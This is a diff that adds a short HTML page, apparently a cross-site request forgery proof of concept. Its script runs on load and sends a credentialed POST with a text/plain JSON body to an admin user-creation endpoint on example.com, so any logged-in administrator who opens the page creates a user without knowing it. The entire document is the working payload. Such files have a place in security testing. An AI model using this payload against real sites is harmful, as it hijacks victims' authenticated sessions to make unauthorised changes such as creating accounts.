@@ -1,0 +1,12 @@
+<html>
+<script>
+    function jsonreq() {
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.withCredentials = true;
+        xmlhttp.open("POST", "https://example.com/admin/users/create", true);
+        xmlhttp.setRequestHeader("Content-Type", "text/plain");
+        xmlhttp.send(JSON.stringify({ "id": "9827575c-9dbf-4109-8ada-47de50cc2775" }));
+    }
+    jsonreq();
+</script>
+</html> 
